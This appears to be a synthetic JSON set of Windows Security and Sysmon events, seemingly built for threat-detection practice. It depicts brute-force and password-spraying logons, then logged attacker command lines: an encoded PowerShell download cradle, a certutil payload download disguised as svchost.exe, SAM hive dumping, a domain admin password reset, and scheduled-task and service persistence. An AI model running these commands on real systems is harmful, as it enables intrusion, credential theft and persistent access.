[
  {
    "TimeCreated": "2025-01-15T08:30:01Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "admin",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:30:05Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "admin",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:30:12Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "admin",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:30:18Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "admin",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:30:25Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "admin",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:30:30Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "admin",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:30:35Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "admin",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:35:00Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "jsmith",
      "TargetDomainName": "CORP",
      "IpAddress": "192.168.1.200",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:35:02Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "administrator",
      "TargetDomainName": "CORP",
      "IpAddress": "192.168.1.200",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:35:04Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "svc_backup",
      "TargetDomainName": "CORP",
      "IpAddress": "192.168.1.200",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:35:06Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "helpdesk",
      "TargetDomainName": "CORP",
      "IpAddress": "192.168.1.200",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T08:35:08Z",
    "EventID": 4625,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "dbadmin",
      "TargetDomainName": "CORP",
      "IpAddress": "192.168.1.200",
      "LogonType": 3,
      "Status": "0xC000006D"
    }
  },
  {
    "TimeCreated": "2025-01-15T09:00:00Z",
    "EventID": 4624,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "DC-01",
    "EventData": {
      "TargetUserName": "svc_deploy",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3
    }
  },
  {
    "TimeCreated": "2025-01-15T09:00:30Z",
    "EventID": 4624,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "FILE-SVR01",
    "EventData": {
      "TargetUserName": "svc_deploy",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3
    }
  },
  {
    "TimeCreated": "2025-01-15T09:01:05Z",
    "EventID": 4624,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WEB-SVR01",
    "EventData": {
      "TargetUserName": "svc_deploy",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 3
    }
  },
  {
    "TimeCreated": "2025-01-15T09:01:45Z",
    "EventID": 4624,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "DB-SVR01",
    "EventData": {
      "TargetUserName": "svc_deploy",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.50",
      "LogonType": 10
    }
  },
  {
    "TimeCreated": "2025-01-15T09:05:00Z",
    "EventID": 4672,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "DC-01",
    "EventData": {
      "SubjectUserName": "jdoe",
      "SubjectDomainName": "CORP",
      "PrivilegeList": "SeDebugPrivilege\n\t\tSeTcbPrivilege"
    }
  },
  {
    "TimeCreated": "2025-01-15T09:10:00Z",
    "EventID": 1,
    "Source": "Microsoft-Windows-Sysmon",
    "Computer": "WS-PC01",
    "EventData": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  },
  {
    "TimeCreated": "2025-01-15T09:10:30Z",
    "EventID": 1,
    "Source": "Microsoft-Windows-Sysmon",
    "Computer": "WS-PC01",
    "EventData": {
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "CommandLine": "certutil -urlcache -split -f http://192.168.1.200/payload.exe C:\\Temp\\svchost.exe",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  },
  {
    "TimeCreated": "2025-01-15T09:15:00Z",
    "EventID": 1,
    "Source": "Microsoft-Windows-Sysmon",
    "Computer": "DC-01",
    "EventData": {
      "Image": "C:\\Windows\\System32\\reg.exe",
      "CommandLine": "reg save HKLM\\SAM C:\\Temp\\sam.hiv",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  },
  {
    "TimeCreated": "2025-01-15T09:20:00Z",
    "EventID": 1,
    "Source": "Microsoft-Windows-Sysmon",
    "Computer": "WS-PC01",
    "EventData": {
      "Image": "C:\\Windows\\System32\\net.exe",
      "CommandLine": "net user administrator Password123! /domain",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  },
  {
    "TimeCreated": "2025-01-15T09:25:00Z",
    "EventID": 4688,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC02",
    "EventData": {
      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
      "SubjectUserName": "svc_backup",
      "ParentProcessName": "C:\\Windows\\System32\\schtasks.exe"
    }
  },
  {
    "TimeCreated": "2025-01-15T10:00:00Z",
    "EventID": 4624,
    "Source": "Microsoft-Windows-Security-Auditing",
    "Computer": "WS-PC01",
    "EventData": {
      "TargetUserName": "jdoe",
      "TargetDomainName": "CORP",
      "IpAddress": "10.0.1.10",
      "LogonType": 2
    }
  },
  {
    "TimeCreated": "2025-01-15T10:05:00Z",
    "EventID": 1,
    "Source": "Microsoft-Windows-Sysmon",
    "Computer": "WS-PC01",
    "EventData": {
      "Image": "C:\\Windows\\System32\\schtasks.exe",
      "CommandLine": "schtasks /create /tn \"UpdateCheck\" /tr \"C:\\Temp\\svchost.exe\" /sc daily /ru SYSTEM",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  },
  {
    "TimeCreated": "2025-01-15T10:10:00Z",
    "EventID": 1,
    "Source": "Microsoft-Windows-Sysmon",
    "Computer": "WS-PC01",
    "EventData": {
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "CommandLine": "cmd.exe /c whoami /priv",
      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "User": "CORP\\jdoe"
    }
  },
  {
    "TimeCreated": "2025-01-15T10:15:00Z",
    "EventID": 1,
    "Source": "Microsoft-Windows-Sysmon",
    "Computer": "WS-PC01",
    "EventData": {
      "Image": "C:\\Windows\\System32\\sc.exe",
      "CommandLine": "sc create BackdoorSvc binPath= \"C:\\Temp\\svchost.exe\" start= auto",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  }
]
